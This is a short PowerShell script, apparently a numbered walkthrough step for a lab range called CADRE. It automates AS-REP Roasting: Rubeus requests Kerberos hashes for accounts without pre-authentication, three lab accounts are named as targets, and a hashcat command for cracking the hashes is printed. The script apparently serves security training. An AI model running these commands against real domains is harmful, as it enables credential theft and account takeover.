# CADRE — WT#003 AS-REP Roasting
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
print_banner "WT#003 - AS-REP Roasting"
start_attack "003" "AS-REP Roasting"
require_tool Rubeus.exe

step "Find accounts with Kerberos pre-auth disabled, request AS-REP hashes"
run_cmd "Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap"

step "Targets in CADRE: intern_blue (child), intern_intel (range), analyst_purple (cadre)"
run_cmd "Write-Host '  hashcat -m 18200 asrep.txt rockyou.txt'"

result $LASTEXITCODE "AS-REP Roasting completed"
